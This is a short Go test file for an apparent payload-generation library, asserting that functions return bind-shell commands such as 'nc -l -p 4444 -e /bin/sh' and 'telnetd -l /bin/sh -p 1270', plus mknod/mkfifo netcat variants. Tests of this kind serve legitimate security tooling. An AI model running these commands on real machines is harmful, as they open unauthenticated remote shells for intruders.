package payload

import (
	"strings"
	"testing"
)

func TestBindShellNetcatGaping(t *testing.T) {
	payload := BindShellNetcatGaping(4444)

	if payload != "nc -l -p 4444 -e /bin/sh" {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestBindShellTelnetdLogin(t *testing.T) {
	payload := BindShellTelnetdLogin(1270)

	if payload != "telnetd -l /bin/sh -p 1270" {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestBindShellMknodNetcat(t *testing.T) {
	payload := BindShellMknodNetcat(1270)

	if !strings.HasPrefix(payload, "cd /tmp; mknod ") {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestBindShellMkfifoNetcat(t *testing.T) {
	payload := BindShellMkfifoNetcat(1270)

	if !strings.HasPrefix(payload, "cd /tmp; mkfifo ") {
		t.Fatal(payload)
	}

	t.Log(payload)
}
